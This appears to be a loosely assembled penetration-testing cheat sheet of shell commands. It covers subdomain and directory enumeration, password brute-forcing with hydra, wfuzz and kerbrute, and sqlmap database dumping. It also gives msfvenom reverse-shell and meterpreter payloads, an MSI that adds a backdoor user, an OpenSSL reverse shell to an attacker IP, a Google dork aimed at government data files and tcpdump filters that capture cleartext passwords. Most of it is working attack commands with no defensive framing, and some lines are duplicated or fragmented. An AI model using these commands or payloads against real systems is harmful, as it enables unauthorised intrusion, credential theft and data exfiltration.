


curl -s "https://crt.sh/?q=%25.$DM&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | grep -o "\w.*$DM" | anew -q .tmp/cert.list


curl -s "https://api.hackertarget.com/hostsearch/?q=$DM" | grep -o "\w.*$DM" | anew -q .tmp/htarget.list


curl -s "https://riddler.io/search/exportcsv?q=pld:$DM" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep -o "\w.*$DM" | anew -q .tmp/riddler.list


assetfinder --subs-only $DM | anew -q .tmp/assetfinder.list
    python3 ~/tools/Sublist3r/


sublist3r.py -d $DM -o .tmp/sublister.list &> /dev/null
   
   
 subfinder -silent -d $DM -all -t 100 -o .tmp/subfinder.list &> /dev/null
 
 
amass enum -passive -d $DM -o .tmp/amass.list &> /dev/null


crobat -s $DM | anew -q .tmp/crobat.list







##-===================-##
##     [+] Check Headers
##-===================-##
python3 finalrecon.py --headers $URL


##-========================-##
##     [+] Check SSL Certificate
##-========================-##
python3 finalrecon.py --sslinfo $URL


##-=====================-##
##     [+] Check Whois Info
##-=====================-##
python3 finalrecon.py --whois $URL

##-===================-##
##     [+] Crawl Target
##-===================-##
python3 finalrecon.py --crawl $URL

##-========================-##
##     [+] Directory Searching
##-========================-##
python3 finalrecon.py --dir $URL -e txt,php -w /$Dir/$File

##-==================-##
##     [+] Full Scan
##-==================-##
python3 finalrecon.py --full $URL





##  Not recursive and with output file:
dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt


##  Test with specified wordlist
dirb http://INSERTIPADDRESS /usr/share/wordlists/dirb/common.txt


##  Test for specific extensions
dirb http://INSERTIPADDRESS -X .php,.txt

##  Through proxy
dirb http://INSERTIPADDRESS -p PROXYIP:PROXYPORT -P proxyusername:proxypassword




##  Web Scanning with extensions


##  Linux (Example web server might be Apache) 
gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,jsp,pl -s 200,204,301,302,307,403,401


##  Windows (Example web server might be IIS)
gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,asp,aspx,jsp,bak -s 200,204,301,302,307,403,401


##  Linux (Example web server might be Apache)
python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,jsp,pl -t 50


##  Windows (Example web server might be IIS)
python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,asp,aspx,jsp,bak -t 50


##  banner inspection
dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old



##  HTTP 
gobuster dir -u http://10.10.10.10 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -t 69


##  HTTPS 
gobuster dir -k -u https://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 69 



gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.27 -x '.php' -e -t 25


gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.27 -e -t 25





##  (in some cases --wildcard will need to be used instead of -k)

##  Nikto 
nikto -h 10.10.10.10 -p 80

##  Nikto HTTPS 
nikto -h 10.10.10.10 -p 443



##  wfuzz POST 
wfuzz --hc 404 -c -z list,admin -z file,/root/Documents/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZ2Z" http://192.168.30.161/admin/index.php 


##  hydra POST 
hydra 192.168.30.161 -s 80 http-form-post "/admin/index.php:user=^USER^&password=^PASS^:Moved Temporarily" -l admin -P /root/Documents/SecLists/Passwords/korelogic-password.txt -t 20 


##  wfuzz NTLM 
wfuzz -c --ntlm "admin:FUZZ" -z file,/root/Documents/SecLists/Passwords/darkc0de.txt --hc 401 https://<ip>/api 


##  wfuzz Basic Auth through Proxy 
wfuzz -c --hc 404,400,401 -z file,/root/Documents/Audits/ActivosProduban/names.txt -z file,/root/Documents/Audits/ActivosProduban/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://<ip>/api/v1/



wfuzz -u http://10.10.10.10/hello.php?dir=../../../../../../../../../FUZZ%00 -w /usr/share/wfuzz/wordlist/general/common.txt



ffuf -u http://FUZZ.$DM/ -t 100 -p '1.0-2.0' -w ~/wordlists/subdomains.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" -mc 200 -r -o .tmp/ffuf.json -s 2> /dev/null &> /dev/null


gobuster dns -d $DM --no-error -z -q -t 100 -w ~/wordlists/subdomains.txt 2> /dev/null | sed 's/Found: //g' | anew -q .tmp/gobuster.list
 

amass enum -active -brute -w ~/wordlists/subdomains.txt -d $DM -o .tmp/amassact.list &> /dev/null
    cat .tmp/ffuf.json 2> /dev/null | jq -r '.results[] | .host' 2> /dev/null | anew -q .tmp/ffuf.list && rm -rf .tmp/ffuf.json


cat .tmp/*.list | grep -v "*" | sed '/@\|<BR>\|\_\|*/d' | grep "$DM" | anew -q .tmp/domains


xargs -a .tmp/domains -P 50 -I % bash -c "assetfinder --subs-only % | anew -q .tmp/seconddomains.list" 2> /dev/null


xargs -a .tmp/domains -P 10 -I % bash -c "amass enum -passive -d %" 2> /dev/null | anew -q .tmp/seconddomains.list



if [ -f "$EC" ]; then
    cat .tmp/*.list | grep -v "*" | grep -vf $EC | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt

else
        cat .tmp/*.list | grep -v "*" | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt

fi



##@> WEB PROBING AND SCREENSHOT
 naabu -retries 3 -r ~/wordlists/resolvers.txt -l database/subdomains.txt -p "$PR" -silent -no-color 2> /dev/null | anew -q database/ports.txt


cat database/ports.txt | httprobe -prefer-https | anew -q database/lives.txt


xargs -a database/lives.txt -P 50 -I % bash -c "echo % | aquatone -chrome-path $CHROME_BIN -out database/screenshots/ -threads 10 -silent" 2> /dev/null &> /dev/null



gospider -S database/lives.txt -d 10 -c 20 -t 50 -K 3 --no-redirect --js -a -w --blacklist ".(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt)" --include-subs -q -o .tmp/gospider 2> /dev/null | anew -q .tmp/gospider.list



xargs -a database/lives.txt -P 50 -I % bash -c "echo % | waybackurls" 2> /dev/null | anew -q .tmp/waybackurls.list



xargs -a database/lives.txt -P 50 -I % bash -c "echo % | gau --blacklist eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg,txt --retries 3 --threads 50" 2> /dev/null | anew -q .tmp/gau.list 2> /dev/null &> /dev/null


##   Filtering duplicate and common endpoints
cat .tmp/gospider.list .tmp/gau.list .tmp/waybackurls.list 2> /dev/null | sed '/\[/d' | grep $DM | sort -u | uro | anew -q database/urls.txt 

 


##  Subdomains:

##  Perform a full subdomain 
##  enumeration on evilcorp.com
bbot -t evilcorp.com -f subdomain-enum


##  Subdomains (passive only):


## Perform a passive-only 
## subdomain enumeration
bbot -t evilcorp.com -f subdomain-enum -rf passive


##  Subdomains + port scan + web screenshots:


## Port-scan every subdomain 
##  screenshot every webpage, 
##  output to current directory
bbot -t evilcorp.com -f subdomain-enum -m nmap gowitness -n my_scan -o .


##  Subdomains + basic web scan:


##  A basic web scan 
##  includes wappalyzer, robots.txt, ##  and other non-intrusive web modules
bbot -t evilcorp.com -f subdomain-enum web-basic


##  Web spider:

##  Crawl www.evilcorp.com 
##  up to a max depth of 2 
##  automatically extracting emails, secrets, etc.
bbot -t www.evilcorp.com -m httpx robots badsecrets secretsdb -c web_spider_distance=2 web_spider_depth=2


##  Everything everywhere all at once:


##  Subdomains, emails, cloud buckets
##  port scan, basic web, 
##  web screenshots, nuclei
bbot -t evilcorp.com -f subdomain-enum email-enum cloud-enum web-basic -m nmap gowitness nuclei --allow-deadly



metagoofil -d $domain -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 20 -n 20  -o ~/Desktop/$domain/metagoofil/ -f ~/Desktop/$domain/users_temp.txt 



python metagoofil.py -d motorola.com -t doc,pdf -l 100 -n 3 -o motorolafiles
 

exiftool -r *.doc | egrep -i "Author|Creator|Email|Producer|Template" | sort -u
 

python metagoofil.py -d [domain name] -t doc,pdf -l 100 -n 3 -o motorolafiles



wpscan --username bully --url http://172.31.2.117/bull/ --wordlist words-john.txt --threads 10



wpscan --url 172.31.2.117/bull/ -r --enumerate u --enumerate p --enumerate t --enumerate tt




## SMB
impacket-smbserver share -smb2support /tmp/

copy \\192.168.1.13\share\nc.exe

## If you get an error, 
## use an account name and password:

impacket-smbserver share -smb2support /tmp/smbshare -user gajos -password gajos

net use g: \\192.168.1.13\share /user:test test




onesixtyone -c wordlist-common-snmp-community-strings.txt 172.31.2.181
 
 
 
snmpwalk -Os -c public -v 1 172.31.2.181





masscan -iL ips-online.txt --rate 10000 -p1-65535 --only-open -oL masscan.out
masscan -e tun0 -p1-65535,U:1-65535 10.10.10.97 --rate 1000


##  find machines on the network
masscan --rate 500 --interface tap0 --router-ip $ROUTER_IP --top-ports 100 $NETWORK -oL masscan_machines.tmp
cat masscan_machines.tmp | grep open | cut -d " " -f4 | sort -u > masscan_machines.lst


##  find open ports for one machine
masscan --rate 1000 --interface tap0 --router-ip $ROUTER_IP -p1-65535,U:1-65535 $MACHINE_IP --banners -oL $MACHINE_IP/scans/masscan-ports.lst


##  TCP grab banners and services information
TCP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep tcp | cut -d " " -f3 | tr '\n' ',' | head -c -1)

[ "$TCP_PORTS" ] && sudo nmap -sT -sC -sV -v -Pn -n -T4 -p$TCP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_tcp $MACHINE_IP



##  UDP grab banners and services information
UDP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep udp | cut -d " " -f3 | tr '\n' ',' | head -c -1)


[ "$UDP_PORTS" ] && sudo nmap -sU -sC -sV -v -Pn -n -T4 -p$UDP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_udp $MACHINE_IP



cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce




##  
sniper -f ips.txt -m massweb -w output.txt


##  
sniper -t <IP> -m webscan -w output.txt




##  MSFVenom - Generating Payloads


##  PHP reverse shell payload
msfvenom -p php/reverse_php LHOST=YOURIPADDRESS LPORT=443 > shell.php


##  Windows reverse shellcode for python script buffer overflow
msfvenom -p windows/shell_reverse_tcp LHOST=YOURIPADDRESS LPORT=443 -f c -e x86/alpha_mixed -b "\x00\x04\xcd\x77\x3f"


##  Windows bind shellcode for python script buffer overflow
msfvenom -p windows/shell_bind_tcp LPORT=444 -f c -e x86/shikata_ga_nai -b  "\x00\x04\xcd\x77\x3f"


##  Meterpreter exe with reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOURIPADDRESS LPORT=4444 -f exe > meterpreter.exe
	
	
##  64-bit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.120 LPORT=4444 -f exe > met64.exe


##  WAR file for Apache Tomcat.
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOURIPADDRESS LPORT=443 -f war > shell.war


##  find malicious js file extract shell.war then browse to js file in browser
jar -xvf shell.war


##  Windows MSI
msfvenom -f msi-nouac -p windows/adduser USER=hackerman PASS=password -o add_user.msi


##  Javascript
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.121 LPORT=443 -f js_le


##  Linux elf binary
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.121 LPORT=443 -b "\x00" -f elf -o filename





##  SQLMap

##  Easy mode:
sqlmap --wizard


##  you need to authenticate before 
##  you can access vulnerable parameter.
##  Capture request with burp and save to request.txt:
sqlmap -r request.txt


##  grab cookie out of burp/proxy and insert into command line option:
sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --cookie "PHPSESSIONID=1234example"


##  Dump:
sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql -D databasename -T tablename --dump


##  Crawl:
sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3




##  OpenSSL Encrypted Reverse Shell


##  Generate certificate:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes


##  Listener: 
openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>


##  Reverse Shell:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s






https://t.me/incidentresponse
https://t.me/sudapodoshel/2
https://t.me/sudapodoshel/2721
https://t.me/RSTReportHub
https://t.me/LibraLair
https://t.me/avleonovnews
https://t.me/SqlDumps/104
http://t.me/combatosint
https://t.me/BoomSecOfficial
https://t.me/thewhiteh4t




#ShadowBrokers






atscan --dork "site:gov.il ext:txt|xlsx|csv" --motor google --level 5 





[SecDevOps]-Toolkit-[Technical-Attacks].md




Show DNS traffic

tcpdump -i <interface> -nn -l udp port 53

    Show HTTP User-Agent & Hosts

tcpdump -i <interface> -nn -l -A -s1500 | egrep -i 'User-Agent:|Host:'

    Show HTTP Requests & Hosts

tcpdump -i <interface> -nn -l -s 0 -v | egrep -i "POST /|GET /|Host:"

    Show email recipients

tcpdump -i <interface> -nn -l port 25 | egrep -i 'MAIL FROM\|RCPT TO'

    Show FTP data

tcpdump -i <interface> -nn -v port ftp or ftp-data

    Show all passwords different protocols

tcpdump -i wlan0 port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '